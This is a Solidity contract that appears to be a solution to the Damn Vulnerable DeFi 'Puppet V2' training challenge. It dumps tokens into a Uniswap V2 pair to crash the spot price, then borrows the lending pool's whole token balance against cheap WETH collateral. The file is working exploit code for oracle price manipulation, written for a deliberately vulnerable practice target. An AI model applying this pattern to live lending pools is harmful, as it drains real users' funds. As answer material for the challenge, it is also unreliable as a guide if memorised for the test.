// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract Solve {
    constructor(
        WETH _weth,
        DamnValuableToken _token,
        PuppetV2Pool _lendingPool,
        IUniswapV2Router02 _uniswapV2Router,
        address _recovery
    ) payable {
        require(_token.balanceOf(address(this)) > 0, "Not enough tokens");
        uint256 initialTokenBalance = _token.balanceOf(address(this));
        _token.approve(address(_uniswapV2Router), initialTokenBalance);
        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = address(_weth);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            initialTokenBalance, 1, path, address(this), block.timestamp + 1 days
        );
        _weth.deposit{value: address(this).balance}();
        _weth.approve(address(_lendingPool), _weth.balanceOf(address(this)));
        _lendingPool.borrow(_token.balanceOf(address(_lendingPool)));
        _token.transfer(_recovery, _token.balanceOf(address(this)));
    }
}
